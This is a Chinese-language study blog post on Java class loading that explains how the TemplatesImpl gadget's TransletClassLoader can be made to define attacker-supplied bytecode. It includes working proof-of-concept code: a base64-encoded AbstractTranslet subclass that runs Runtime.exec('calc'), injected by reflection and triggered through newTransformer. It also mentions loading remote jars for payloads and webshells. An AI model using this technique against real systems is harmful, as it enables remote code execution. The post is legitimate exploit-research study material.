Java程序在运行前需要先编译成`class文件`，Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`会调用JVM的native方法（`defineClass0/1/2`）来定义一个`java.lang.Class`实例。

## 类加载方式

显式 -->动态加载

通过反射或者classLoader进行加载

通过反射

`Class.forName("类名")`默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用`Class.forName("类名", 是否初始化类, 类加载器)`

通过ClassLoader

`ClassLoader.loadClass`默认不会初始化类方法。

### 流程

调用public Class<?> loadClass(String name)加载类

调用`findLoadedClass`方法检查类是否已经初始化，如果已经初始化则返回类对象，后面的流程不再继续

创建当前`ClassLoader`时传入了父类加载器（`new ClassLoader(父类加载器)`）就使用父类加载器加载`TestHelloWorld`类，否则使用JVM的`Bootstrap ClassLoader`加载。

若上一步无法加载调用自身的`findClass`方法尝试加载`TestHelloWorld`类

如果当前的`ClassLoader`没有重写`findClass`方法，那么直接返回类加载失败异常。如果当前类重写了`findClass`方法并通过传入的类名找到了对应的类字节码，那么应该调用`defineClass`方法去JVM中注册该类。

如果调用loadClass的时候传入的`resolve`参数为true，那么还需要调用`resolveClass`方法链接类，默认为false。

返回类对象

## URLClasserLoader

继承于java.lang.Classloader,`URLClassLoader`提供了加载远程资源的能力，在写漏洞利用的`payload`或者`webshell`的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用

## 利用TemplatesImpl加载类

“com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl”

这个类中，定义了一个内部类，`TransletClassLoader`

```java
    static final class TransletClassLoader extends ClassLoader {
        private final Map<String,Class> _loadedExternalExtensionFunctions;

         TransletClassLoader(ClassLoader parent) {
             super(parent);
            _loadedExternalExtensionFunctions = null;
        }

        TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
            super(parent);
            _loadedExternalExtensionFunctions = mapEF;
        }

        public Class<?> loadClass(String name) throws ClassNotFoundException {
            Class<?> ret = null;
            // The _loadedExternalExtensionFunctions will be empty when the
            // SecurityManager is not set and the FSP is turned off
            if (_loadedExternalExtensionFunctions != null) {
                ret = _loadedExternalExtensionFunctions.get(name);
            }
            if (ret == null) {
                ret = super.loadClass(name);
            }
            return ret;
         }

        /**
         * Access to final protected superclass member from outer class.
         */
        Class defineClass(final byte[] b) {
            return defineClass(null, b, 0, b.length);
        }
    }
```

可以看到这里重写了defineClass方法，defineClass方法没有显式的声明其定义域，其作用域就是为default，也就是说这里的defineClass尤其父类的protected类型编程了一个default类型的方法，可以被类外部调用。

看下调用链

```java
TemplatesImpl.getOutputProperties
TemplatesImpl.newTransformer
TemplatesImpl.getTransletInstance
TemplatesImpl.defineTransletClasses
TransletClassLoader.defineClass
```

> 我自己觉得TemplatesImpl.getOutputProperties有点多余，我可以直接调用newTransformer的

就不贴代码了，主要解释下几个需要注意的地方

![image-20240513234450489](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240513234450489.png)

_class需要为null, _name不能为null,否则返回

`_tfactory` 需要是一个 `TransformerFactoryImpl` 对象，因为`TemplatesImpl#defineTransletClasses()` 方法里有调用到`_tfactory.getExternalExtensionsMap()` ，如果是null会出错

![image-20240513235056676](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240513235056676.png)

以及注意，_bytecode是二维数组，记得转换类型

![image-20240513235154268](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240513235154268.png)

另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须
是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类。

所以在获取字节码的时候必须要保证我们构造的类是AbstractTranslet的子类。

[抄袭nivia的代码](https://nivi4.notion.site/Java-bdd6e68fe4b0498983cb6bf8a3dac9d8)

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.util.Arrays;
import java.lang.reflect.Field;
import java.util.Base64;


public class impl {
    public static void main(String[] args) throws Exception {
        Class<?> claz = Class.forName("org.example.classcode");
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKgoABgAdCgAeAB8IACAKAB4AIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTG9yZy9leGFtcGxlL2NsYXNzY29kZTsBAApFeGNlcHRpb25zBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADmNsYXNzY29kZS5qYXZhDAAHAAgHACUMACYAJwEABGNhbGMMACgAKQEAFW9yZy9leGFtcGxlL2NsYXNzY29kZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAsABAAMAA0ADQALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAQAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABAACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgABABAAFgABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEwALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABcAGAACAAAAAQAZABoAAwABABsAAAACABw=");
        TemplatesImpl impl = new TemplatesImpl();
        setFieldValue(impl, "_name", "nivia");
        setFieldValue(impl, "_bytecodes", new byte[][]{code});
        setFieldValue(impl, "_class", null);
        setFieldValue(impl, "_tfactory", new TransformerFactoryImpl());
        impl.newTransformer();

    }

    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
```

```java
package org.example;

import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class classcode extends AbstractTranslet {
    public classcode() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

}
```

把这个类转化为字节码然后base64就好
